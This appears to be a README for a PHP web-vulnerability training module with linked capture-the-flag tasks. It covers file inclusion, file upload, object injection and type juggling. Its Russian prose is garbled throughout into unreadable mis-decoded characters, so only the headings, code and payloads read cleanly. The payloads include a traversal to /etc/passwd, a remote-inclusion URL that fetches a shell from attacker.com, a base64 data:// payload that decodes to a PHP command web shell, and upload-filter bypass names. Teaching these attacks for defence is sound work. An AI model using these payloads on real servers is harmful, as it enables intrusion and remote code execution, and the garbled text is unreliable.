# Module 1: PHP Vulnerabilities

## –û–ø–∏—Å–∞–Ω–∏–µ –º–æ–¥—É–ª—è

–≠—Ç–æ—Ç –º–æ–¥—É–ª—å –ø–æ—Å–≤—è—â–µ–Ω –∏–∑—É—á–µ–Ω–∏—é —É—è–∑–≤–∏–º–æ—Å—Ç–µ–π –≤ PHP –≤–µ–±-–ø—Ä–∏–ª–æ–∂–µ–Ω–∏—è—Ö. –ó–¥–µ—Å—å –≤—ã –Ω–∞—É—á–∏—Ç–µ—Å—å –Ω–∞—Ö–æ–¥–∏—Ç—å –∏ —ç–∫—Å–ø–ª—É–∞—Ç–∏—Ä–æ–≤–∞—Ç—å –Ω–∞–∏–±–æ–ª–µ–µ —Ä–∞—Å–ø—Ä–æ—Å—Ç—Ä–∞–Ω–µ–Ω–Ω—ã–µ —É—è–∑–≤–∏–º–æ—Å—Ç–∏ –≤ PHP –∫–æ–¥–µ.

## –¢–∏–ø—ã —É—è–∑–≤–∏–º–æ—Å—Ç–µ–π –≤ —ç—Ç–æ–º –º–æ–¥—É–ª–µ

### 1. Local File Inclusion (LFI)

**–ß—Ç–æ —ç—Ç–æ?**
Local File Inclusion (LFI) - —ç—Ç–æ —É—è–∑–≤–∏–º–æ—Å—Ç—å, –∫–æ—Ç–æ—Ä–∞—è –ø–æ–∑–≤–æ–ª—è–µ—Ç –∞—Ç–∞–∫—É—é—â–µ–º—É –≤–∫–ª—é—á–∞—Ç—å –ª–æ–∫–∞–ª—å–Ω—ã–µ —Ñ–∞–π–ª—ã –Ω–∞ —Å–µ—Ä–≤–µ—Ä–µ —á–µ—Ä–µ–∑ –º–∞–Ω–∏–ø—É–ª—è—Ü–∏—é –≤—Ö–æ–¥–Ω—ã–º–∏ –ø–∞—Ä–∞–º–µ—Ç—Ä–∞–º–∏.

**–ö–∞–∫ –≤–æ–∑–Ω–∏–∫–∞–µ—Ç?**
```php
// –£—è–∑–≤–∏–º—ã–π –∫–æ–¥:
$page = $_GET['page'];
include($page . '.php');
```

**–ö–∞–∫ –∏—Å–∫–∞—Ç—å?**
1. –ò—â–∏—Ç–µ –ø–∞—Ä–∞–º–µ—Ç—Ä—ã URL, –∫–æ—Ç–æ—Ä—ã–µ –≤–∫–ª—é—á–∞—é—Ç —Ñ–∞–π–ª—ã (page, file, include, path)
2. –ü–æ–ø—Ä–æ–±—É–π—Ç–µ path traversal: `../../../etc/passwd`
3. –û–±—Ä–∞—Ç–∏—Ç–µ –≤–Ω–∏–º–∞–Ω–∏–µ –Ω–∞ PHP wrappers: `php://filter`, `php://input`
4. –ü–æ–ø—Ä–æ–±—É–π—Ç–µ null byte injection (–≤ —Å—Ç–∞—Ä—ã—Ö –≤–µ—Ä—Å–∏—è—Ö PHP): `file.txt%00`

**–ó–∞—â–∏—Ç–∞:**
- –ò—Å–ø–æ–ª—å–∑—É–π—Ç–µ whitelist —Ä–∞–∑—Ä–µ—à–µ–Ω–Ω—ã—Ö —Ñ–∞–π–ª–æ–≤
- –ò–∑–±–µ–≥–∞–π—Ç–µ –ø—Ä—è–º–æ–≥–æ –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏—è –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å—Å–∫–æ–≥–æ –≤–≤–æ–¥–∞ –≤ include/require
- –ò—Å–ø–æ–ª—å–∑—É–π—Ç–µ `basename()` –¥–ª—è —É–¥–∞–ª–µ–Ω–∏—è path traversal
- –û—Ç–∫–ª—é—á–∏—Ç–µ `allow_url_include` –≤ php.ini

### 2. Remote File Inclusion (RFI)

**–ß—Ç–æ —ç—Ç–æ?**
RFI –ø–æ–∑–≤–æ–ª—è–µ—Ç –≤–∫–ª—é—á–∞—Ç—å —É–¥–∞–ª–µ–Ω–Ω—ã–µ —Ñ–∞–π–ª—ã —á–µ—Ä–µ–∑ HTTP/FTP –ø—Ä–æ—Ç–æ–∫–æ–ª—ã.

**–ö–∞–∫ –≤–æ–∑–Ω–∏–∫–∞–µ—Ç?**
```php
// –£—è–∑–≤–∏–º—ã–π –∫–æ–¥ —Å allow_url_include = On:
include($_GET['file']);
```

**–ö–∞–∫ –∏—Å–∫–∞—Ç—å?**
1. –ü—Ä–æ–≤–µ—Ä—å—Ç–µ, –≤–∫–ª—é—á–µ–Ω –ª–∏ `allow_url_include`
2. –ü–æ–ø—Ä–æ–±—É–π—Ç–µ –ø–æ–¥—Å—Ç–∞–≤–∏—Ç—å –≤–Ω–µ—à–Ω–∏–π URL: `?file=http://attacker.com/shell.txt`
3. –ò—Å–ø–æ–ª—å–∑—É–π—Ç–µ PHP wrappers: `data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=`

### 3. File Upload Vulnerabilities

**–ß—Ç–æ —ç—Ç–æ?**
–£—è–∑–≤–∏–º–æ—Å—Ç—å –∑–∞–≥—Ä—É–∑–∫–∏ —Ñ–∞–π–ª–æ–≤ –ø–æ–∑–≤–æ–ª—è–µ—Ç –∑–∞–≥—Ä—É–∂–∞—Ç—å –∏—Å–ø–æ–ª–Ω—è–µ–º—ã–π –∫–æ–¥ –Ω–∞ —Å–µ—Ä–≤–µ—Ä.

**–ö–∞–∫ –≤–æ–∑–Ω–∏–∫–∞–µ—Ç?**
- –ù–µ–¥–æ—Å—Ç–∞—Ç–æ—á–Ω–∞—è –≤–∞–ª–∏–¥–∞—Ü–∏—è —Ç–∏–ø–∞ —Ñ–∞–π–ª–∞
- –ü—Ä–æ–≤–µ—Ä–∫–∞ —Ç–æ–ª—å–∫–æ –ø–æ MIME-type –∏–ª–∏ —Ä–∞—Å—à–∏—Ä–µ–Ω–∏—é
- –í–æ–∑–º–æ–∂–Ω–æ—Å—Ç—å –ø–µ—Ä–µ–∑–∞–ø–∏—Å–∞—Ç—å .htaccess
- –û—Ç—Å—É—Ç—Å—Ç–≤–∏–µ –ø—Ä–æ–≤–µ—Ä–∫–∏ —Å–æ–¥–µ—Ä–∂–∏–º–æ–≥–æ —Ñ–∞–π–ª–∞

**–ö–∞–∫ –∏—Å–∫–∞—Ç—å?**
1. –ü–æ–ø—Ä–æ–±—É–π—Ç–µ –∑–∞–≥—Ä—É–∑–∏—Ç—å PHP shell —Å —Ä–∞—Å—à–∏—Ä–µ–Ω–∏–µ–º `.php`
2. –ü–æ–ø—Ä–æ–±—É–π—Ç–µ –æ–±–æ–π—Ç–∏ –ø—Ä–æ–≤–µ—Ä–∫—É:
   - `.php.jpg`
   - `.php5`, `.phtml`, `.phar`
   - –î–≤–æ–π–Ω–æ–µ —Ä–∞—Å—à–∏—Ä–µ–Ω–∏–µ: `shell.php.png`
   - Null byte: `shell.php%00.png`
3. –ü–æ–ø—Ä–æ–±—É–π—Ç–µ –∏–∑–º–µ–Ω–∏—Ç—å Content-Type –≤ –∑–∞–ø—Ä–æ—Å–µ
4. –ü—Ä–æ–≤–µ—Ä—å—Ç–µ, –º–æ–∂–Ω–æ –ª–∏ –∑–∞–≥—Ä—É–∑–∏—Ç—å `.htaccess` –¥–ª—è –∏–∑–º–µ–Ω–µ–Ω–∏—è –æ–±—Ä–∞–±–æ—Ç–∫–∏ —Ñ–∞–π–ª–æ–≤
5. –ò—Å–ø–æ–ª—å–∑—É–π—Ç–µ magic bytes (–Ω–∞—á–∞–ª–æ —Ñ–∞–π–ª–∞) –¥–ª—è –æ–±—Ö–æ–¥–∞ –ø—Ä–æ–≤–µ—Ä–∫–∏ –ø–æ —Å–æ–¥–µ—Ä–∂–∏–º–æ–º—É

**–ó–∞—â–∏—Ç–∞:**
- –ü—Ä–æ–≤–µ—Ä—è–π—Ç–µ —Å–æ–¥–µ—Ä–∂–∏–º–æ–µ —Ñ–∞–π–ª–∞, –∞ –Ω–µ —Ç–æ–ª—å–∫–æ —Ä–∞—Å—à–∏—Ä–µ–Ω–∏–µ
- –°–æ—Ö—Ä–∞–Ω—è–π—Ç–µ —Ñ–∞–π–ª—ã –≤–Ω–µ webroot –∏–ª–∏ –≤ –ø–∞–ø–∫–µ –±–µ–∑ –ø—Ä–∞–≤ –≤—ã–ø–æ–ª–Ω–µ–Ω–∏—è
- –ì–µ–Ω–µ—Ä–∏—Ä—É–π—Ç–µ —Å–ª—É—á–∞–π–Ω—ã–µ –∏–º–µ–Ω–∞ —Ñ–∞–π–ª–æ–≤
- –ò—Å–ø–æ–ª—å–∑—É–π—Ç–µ whitelist –¥–æ–ø—É—Å—Ç–∏–º—ã—Ö —Ä–∞—Å—à–∏—Ä–µ–Ω–∏–π
- –ü—Ä–æ–≤–µ—Ä—è–π—Ç–µ —Ä–∞–∑–º–µ—Ä —Ñ–∞–π–ª–∞

### 4. PHP Object Injection

**–ß—Ç–æ —ç—Ç–æ?**
–£—è–∑–≤–∏–º–æ—Å—Ç—å –ø—Ä–∏ –¥–µ—Å–µ—Ä–∏–∞–ª–∏–∑–∞—Ü–∏–∏ –Ω–µ–¥–æ–≤–µ—Ä–µ–Ω–Ω—ã—Ö –¥–∞–Ω–Ω—ã—Ö –≤ PHP.

**–ö–∞–∫ –≤–æ–∑–Ω–∏–∫–∞–µ—Ç?**
```php
// –£—è–∑–≤–∏–º—ã–π –∫–æ–¥:
$data = unserialize($_GET['data']);
```

**–ö–∞–∫ –∏—Å–∫–∞—Ç—å?**
1. –ò—â–∏—Ç–µ –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ `unserialize()` —Å –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å—Å–∫–∏–º –≤–≤–æ–¥–æ–º
2. –ò–∑—É—á–∏—Ç–µ magic methods: `__wakeup()`, `__destruct()`, `__toString()`
3. –ü–æ–ø—Ä–æ–±—É–π—Ç–µ —Å–æ–∑–¥–∞—Ç—å payload —Å –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ–º —Å—É—â–µ—Å—Ç–≤—É—é—â–∏—Ö –∫–ª–∞—Å—Å–æ–≤
4. –ò—Å–ø–æ–ª—å–∑—É–π—Ç–µ –∏–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç—ã —Ç–∏–ø–∞ PHPGGC –¥–ª—è –≥–µ–Ω–µ—Ä–∞—Ü–∏–∏ gadget chains

### 5. PHP Type Juggling

**–ß—Ç–æ —ç—Ç–æ?**
–°–ª–∞–±–∞—è —Ç–∏–ø–∏–∑–∞—Ü–∏—è PHP –º–æ–∂–µ—Ç –ø—Ä–∏–≤–æ–¥–∏—Ç—å –∫ –Ω–µ–æ–∂–∏–¥–∞–Ω–Ω—ã–º —Ä–µ–∑—É–ª—å—Ç–∞—Ç–∞–º —Å—Ä–∞–≤–Ω–µ–Ω–∏—è.

**–ü—Ä–∏–º–µ—Ä—ã:**
```php
"0e123" == "0e456"  // true (–æ–±–∞ –∏–Ω—Ç–µ—Ä–ø—Ä–µ—Ç–∏—Ä—É—é—Ç—Å—è –∫–∞–∫ 0 * 10^123)
"0" == "anything"   // false
0 == "anything"     // true
true == "anything"  // true
```

**–ö–∞–∫ –∏—Å–∫–∞—Ç—å?**
1. –ò—â–∏—Ç–µ –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ `==` –≤–º–µ—Å—Ç–æ `===`
2. –û–±—Ä–∞—Ç–∏—Ç–µ –≤–Ω–∏–º–∞–Ω–∏–µ –Ω–∞ —Å—Ä–∞–≤–Ω–µ–Ω–∏—è —Ö–µ—à–µ–π (MD5, SHA1)
3. –ü–æ–ø—Ä–æ–±—É–π—Ç–µ –ø–æ–¥–æ–±—Ä–∞—Ç—å —Å—Ç—Ä–æ–∫–∏, –∫–æ—Ç–æ—Ä—ã–µ –Ω–∞—á–∏–Ω–∞—é—Ç—Å—è —Å `0e` –∏ —Å–æ–¥–µ—Ä–∂–∞—Ç —Ç–æ–ª—å–∫–æ —Ü–∏—Ñ—Ä—ã

## –ó–∞–¥–∞–Ω–∏—è –≤ –º–æ–¥—É–ª–µ

### [Task 1: php_easy_include](./tasks/php_easy_include/)
–ë–∞–∑–æ–≤–∞—è –∑–∞–¥–∞—á–∞ –Ω–∞ —ç–∫—Å–ø–ª—É–∞—Ç–∞—Ü–∏—é LFI —É—è–∑–≤–∏–º–æ—Å—Ç–∏.

### [Task 2: php_load_image](./tasks/php_load_image/)
–ó–∞–¥–∞—á–∞ –Ω–∞ –æ–±—Ö–æ–¥ —Ñ–∏–ª—å—Ç—Ä–æ–≤ –ø—Ä–∏ –∑–∞–≥—Ä—É–∑–∫–µ —Ñ–∞–π–ª–æ–≤.

### [Task 3: php_medium](./tasks/php_medium/)
–ë–æ–ª–µ–µ —Å–ª–æ–∂–Ω–∞—è –∑–∞–¥–∞—á–∞ —Å –∫–æ–º–ø–ª–µ–∫—Å–Ω—ã–º PHP –ø—Ä–∏–ª–æ–∂–µ–Ω–∏–µ–º.

## –ü–æ–ª–µ–∑–Ω—ã–µ –∏–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç—ã

- **Burp Suite** - –¥–ª—è –ø–µ—Ä–µ—Ö–≤–∞—Ç–∞ –∏ –º–æ–¥–∏—Ñ–∏–∫–∞—Ü–∏–∏ HTTP –∑–∞–ø—Ä–æ—Å–æ–≤
- **PHPGGC** - –≥–µ–Ω–µ—Ä–∞—Ç–æ—Ä gadget chains –¥–ª—è PHP object injection
- **PHP Wrapper –¥–ª—è LFI:**
  - `php://filter/convert.base64-encode/resource=file.php`
  - `php://input` (—Å POST –¥–∞–Ω–Ω—ã–º–∏)
  - `data://text/plain;base64,BASE64_PAYLOAD`
  - `expect://command` (–µ—Å–ª–∏ —Ä–∞—Å—à–∏—Ä–µ–Ω–∏–µ expect —É—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–æ)
- **Wfuzz / ffuf** - –¥–ª—è —Ñ–∞–∑–∑–∏–Ω–≥–∞ –ø–∞—Ä–∞–º–µ—Ç—Ä–æ–≤

## –ü–æ–ª–µ–∑–Ω—ã–µ —Ä–µ—Å—É—Ä—Å—ã

- [OWASP PHP Security Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/PHP_Configuration_Cheat_Sheet.html)
- [PayloadsAllTheThings - File Inclusion](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion)
- [PayloadsAllTheThings - File Upload](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files)
- [HackTricks - File Inclusion/Path Traversal](https://book.hacktricks.xyz/pentesting-web/file-inclusion)

## –ü—Ä–∞–∫—Ç–∏–∫–∞

–ü–æ—Å–ª–µ –∏–∑—É—á–µ–Ω–∏—è —Ç–µ–æ—Ä–∏–∏, –ø–µ—Ä–µ—Ö–æ–¥–∏—Ç–µ –∫ –≤—ã–ø–æ–ª–Ω–µ–Ω–∏—é –∑–∞–¥–∞–Ω–∏–π –≤ –ø–∞–ø–∫–µ `tasks/`. –ù–∞—á–Ω–∏—Ç–µ —Å –±–æ–ª–µ–µ –ø—Ä–æ—Å—Ç—ã—Ö –∏ –ø–æ—Å—Ç–µ–ø–µ–Ω–Ω–æ –ø–µ—Ä–µ—Ö–æ–¥–∏—Ç–µ –∫ —Å–ª–æ–∂–Ω—ã–º.

–£–¥–∞—á–∏! üöÄ

